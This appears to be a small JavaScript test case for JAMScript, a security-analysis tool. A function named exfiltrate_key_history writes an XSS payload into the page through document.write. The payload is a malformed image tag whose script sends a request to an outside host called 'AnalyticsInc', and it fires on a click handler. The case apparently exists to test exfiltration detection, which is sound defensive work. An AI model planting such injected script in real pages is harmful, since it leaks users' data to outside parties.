
JAM.startProfile('load');
introspect(JAMScript.introspectors.processAll) {
function exfiltrate_key_history() {
  var URL = '<IMG """><SCRIPT>xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=xss6", true);xmlhttp.send(null);\x3c/SCRIPT>">';
  document.write(URL);
  return
}
var v0 = document.getElementById("test");
v0.onclick = exfiltrate_key_history;

}

JAM.stopProfile('load');
